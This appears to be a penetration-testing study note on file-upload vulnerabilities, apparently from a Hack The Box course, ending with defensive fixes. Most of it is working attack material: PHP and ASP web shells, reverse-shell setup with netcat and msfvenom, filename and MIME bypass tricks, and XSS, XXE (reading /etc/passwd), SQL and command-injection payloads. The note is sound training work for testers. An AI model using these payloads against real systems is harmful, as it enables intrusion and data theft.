# File Upload Attacks

> Status: ✅ Reference complete
> Date started: 2026-10-26
> Date finished: 2026-10-27

## 1. Goal
Abuse a file-upload feature to get code execution (upload a web shell / reverse shell) or other impact by defeating the upload validation. File-upload bugs are mostly rated **High/Critical** (CWE-434); the worst is an **unauthenticated arbitrary file upload**. The whole game is **bypassing the validation**.

## Identify the web framework (pick the right shell)
A web shell must be in the server's language, so first find what runs the app:
- URL/page extension (`.php`, `.asp`, `.aspx`) — but routes can hide it.
- Visit `/index.ext` swapping `ext` (php/asp/aspx…) — same page back = that language. Fuzz with Burp Intruder + a web-extensions wordlist.
- **Wappalyzer** extension (lang + server + OS + libs), or Burp/ZAP scanners.

## Absent validation (arbitrary upload)
No filter at all → upload a script directly. Confirm code execution first with a harmless test:
```php
<?php echo "Hello HTB"; ?>        // upload test.php → visit /uploads/test.php
// renders "Hello HTB" = PHP executes; shows source = it doesn't
```

## Upload exploitation — shells
**Web shells** (interactive in-browser):
```php
<?php system($_REQUEST['cmd']); ?>     // shell.php → /uploads/shell.php?cmd=id  (view-source Ctrl+U for clean output)
<% eval request('cmd') %>              // .NET/ASP equivalent → ?cmd=id
```
Ready-made: **phpbash** (terminal-like PHP web shell), SecLists `/opt/useful/seclists/Web-Shells/`. If `system()` is disabled or a WAF blocks it, try another shell / advanced bypass.

**Reverse shells** (preferred — more interactive):
```bash
# pentestmonkey php-reverse-shell.php → edit $ip/$port (lines 49-50), start listener, upload, visit:
nc -lvnp <PORT>
# or generate one:
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > reverse.php
```
Reverse shells can fail (egress firewall, disabled functions) → fall back to a web shell.

## Bypassing client-side validation
JS checks the extension in-browser, **no HTTP request on select**. Two ways:
1. **Burp**: capture the real `POST /upload.php`, change `filename="HTB.png"` → `shell.php` and the body to your shell, forward.
2. **Disable the JS**: Page Inspector (`Ctrl+Shift+C`) → find `onchange="checkFile(this)"` on the `<input type=file>` → delete the `checkFile` call (and the `accept=".jpg,..."` attr). Temporary (client-side only), but enough to upload.

Find the uploaded path via the inspector (`<img src="/profile_images/shell.php">`).

## Bypassing blacklist (extension)
Blacklists block known-bad extensions but are rarely comprehensive. Example weak server code:
```php
$blacklist = array('.php', '.phtml', ...);
foreach ($blacklist as $ext) {
    if (strpos($fileName, $ext) !== false) { echo "Extension not allowed"; die(); }
}
```
- **Fuzz for allowed executable extensions** with Burp Intruder + a PHP-extensions wordlist (e.g. PayloadsAllTheThings / SecLists web-extensions). **Un-tick URL-encode** so the `.` isn't encoded.
- Use an allowed one that still executes PHP: `.phtml`, `.php2`–`.php7`, `.phar`, `.pgif`, `.phP`/`.pHp`/mixed-case (Windows filenames are case-insensitive; a blacklist that only lists lowercase `.php` misses `.pHp`).

## Bypassing whitelist (extension)
Whitelist = only allowed extensions pass (more secure, doesn't need to be exhaustive). Blacklist + whitelist are often used in tandem. Weak **non-anchored** regex:
```php
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) { echo "Only images are allowed"; die(); }
// flaw: checks the name CONTAINS an image ext, not that it ENDS with one
```
- **Double extension** — if `.jpg` is allowed, append after it: `shell.jpg.php`. Passes the "contains `.jpg`" test, still ends in `.php` → executes. Visit `/profile_images/shell.jpg.php?cmd=id` → runs as www-data.
- **Strict regex** (`'/^.*\.(jpg|jpeg|png|gif)$/'`, anchored with `$`) only matches the *final* extension → double-extension fails. Fall back to misconfig/injection tricks below.
- **Reverse double extension** — functionality is safe but the **web-server config** executes PHP on any name *containing* `.php`. Classic Apache misconfig in `/etc/apache2/mods-enabled/php7.4.conf`:
  ```xml
  <FilesMatch ".+\.ph(ar|p|tml)">
      SetHandler application/x-httpd-php
  </FilesMatch>
  ```
  Regex not anchored with `$` → `shell.php.jpg` passes the strict whitelist (ends `.jpg`) **and** executes PHP (contains `.php`). Also fuzz which extensions the app blacklists, so you pick one that's whitelisted *and* server-executed.
- **Character injection** — inject chars before/after the final ext to make the app misinterpret the filename. Candidates:
  ```
  %20  %0a  %00  %0d0a  /  .\  .  …  :
  ```
  - `shell.php%00.jpg` → PHP ≤5.X truncates at `%00`, stored as `shell.php` (passes whitelist on `.jpg`).
  - `shell.aspx:.jpg` → Windows colon trick, written as `shell.aspx`.
  - Generate all permutations with a small bash script, then fuzz with Burp Intruder:
  ```bash
  for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
      for ext in '.php' '.phps'; do
          echo "shell$char$ext.jpg" >> wordlist.txt
          echo "shell$ext$char.jpg" >> wordlist.txt
          echo "shell.jpg$char$ext" >> wordlist.txt
          echo "shell.jpg$ext$char" >> wordlist.txt
      done
  done
  ```

## Bypassing type filters (content validation)
Extension checks aren't enough, so servers also validate **content**, in two places:

**Content-Type header** (client-set, from the file dialog → spoofable):
```php
$type = $_FILES['uploadFile']['type'];
if (!in_array($type, array('image/jpg','image/jpeg','image/png','image/gif'))) { echo "Only images are allowed"; die(); }
```
- Fuzz allowed types with SecLists' Content-Type wordlist in Burp Intruder; filter to image types (~45 vs ~700).
- Intercept and set the **file's** `Content-Type` header to e.g. `image/jpg` while the body stays PHP → uploads.
- Note: a multipart upload has **two** Content-Type headers — the per-file one (bottom, usually the target) and the request one (top; modify this one if content was sent as raw POST data).

**MIME-type / magic bytes** (server reads the first bytes = File Signature):
```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);
if (!in_array($type, array('image/jpg','image/jpeg','image/png','image/gif'))) { echo "Only images are allowed"; die(); }
```
- GIF signature is `GIF87a` / `GIF89a`; the ASCII-printable `GIF8` prefix is enough to imitate a GIF (other image sigs use non-printable bytes).
- Demo with `file` (Unix finds type by MIME, not extension):
  ```bash
  echo "this is a text file" > text.jpg && file text.jpg   # → ASCII text
  echo "GIF8" > text.jpg && file text.jpg                  # → GIF image data
  ```
- Attack: prepend `GIF8` to the PHP, keep the `.php` extension → passes MIME check, PHP still executes (output just starts with `GIF8`).
- Combine both: allowed MIME + disallowed Content-Type, allowed types + disallowed ext, etc. — permute to confuse robust filters.

## Limited (non-arbitrary) uploads — other attacks
Even when only specific types pass, crafted files still hit the app. **Fuzz allowed extensions** to see what's possible.

**Stored XSS**
- Upload an **HTML** file with JS → XSS/CSRF on visitors.
- Image **metadata** reflected on the page — inject via EXIF:
  ```bash
  exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
  ```
  Changing the image MIME to `text/html` can make it render as HTML and fire even if metadata isn't shown.
- **SVG** is XML → embed script:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
  <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
      <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
      <script type="text/javascript">alert(window.origin);</script>
  </svg>
  ```

**XXE / SSRF** (SVG, or any XML-based doc — PDF/DOCX/PPTX)
```xml
<!-- read a system file -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

<!-- read PHP source (base64) → decode for whitebox review / find upload dir -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
Office docs embed XML too → blind XXE via a vulnerable document viewer. XXE can also pivot to **SSRF** (hit internal services / private APIs).

**DoS**
- Reuse XXE payloads for DoS.
- **Decompression bomb** — nested ZIPs that auto-unzip to petabytes → crash.
- **Pixel flood** — JPG/PNG with compression data faked to `0xffff x 0xffff` (~4 Gigapixels) → memory exhaustion on render.
- Overly large file (no size limit) fills disk.
- Directory traversal upload (`../../../etc/passwd`) can crash the server.

## Other upload attacks
**Injections in the file name** (if the name is reflected / used in a command/query):
```
file$(whoami).jpg    file`whoami`.jpg    file.jpg||whoami      # OS command injection (e.g. app runs mv)
<script>alert(window.origin);</script>                        # stored XSS via filename
file';select+sleep(5);--.jpg                                  # SQLi via filename
```
**Upload-directory disclosure** (when you can't see the uploaded link):
- Fuzz for the uploads dir; use LFI/XXE to read source; see Web Attacks/IDOR for naming schemes.
- Force errors: upload a duplicate name, send two identical requests at once, or an overly long name (~5,000 chars) → server may leak the path in the error.

**Windows-specific**
- Reserved chars `|  <  >  *  ?` → may point at another file and error out (path disclosure).
- Reserved names `CON COM1 LPT1 NUL` → write fails → error.
- **8.3 short names** — `HAC~1.TXT` refers to `hackthebox.txt`; write `WEB~1.CON` to overwrite `web.conf` / sensitive files (info disclosure, DoS, or access to private files).

**Advanced** — any automatic processing (video encode, compression, rename) can be exploitable; e.g. **AVI→XXE in ffmpeg**. Custom libs need deeper analysis; read bug-bounty reports.

## Preventing file-upload vulnerabilities (report action points)
**Extension validation** — whitelist **and** blacklist (defense in depth), anchored regex, front- *and* back-end:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
// blacklist (contains)
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) { echo "Only images are allowed"; die(); }
// whitelist (ends with, anchored)
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { echo "Only images are allowed"; die(); }
```
**Content validation** — validate extension *and* signature *and* Content-Type, and make them match:
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
if (!preg_match('/^.*\.png$/', $fileName)) { echo "Only PNG images are allowed"; die(); }
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) { echo "Only PNG images are allowed"; die(); }
}
```
**Upload disclosure** — don't expose the uploads dir or serve files directly. Use a `download.php` that: enforces authorization (stop IDOR) and path allowlists (stop LFI); returns **403** on direct dir access; sets `Content-Disposition: attachment`, correct `Content-Type`, `X-Content-Type-Options: nosniff`. Randomize stored filenames (keep sanitized original in DB). Store uploads on a separate server/container; use PHP `open_basedir`.
**Further** — PHP `disable_functions = exec,shell_exec,system,passthru,...`; hide server/app errors; limit file size; update libraries; AV-scan uploads; WAF as a secondary layer.

## Fix (summary)
Whitelist by extension **and** validate content/magic bytes; store uploads outside the webroot or on a non-exec path; randomize filenames; serve with a safe Content-Type; never trust client-side checks.

> Order of bypass attempts: client-side → blacklist (alt extension) → whitelist (double/reverse ext, char injection) → content-type → magic bytes. SVG is the sleeper — "image" upload that's really XML → XSS and XXE.
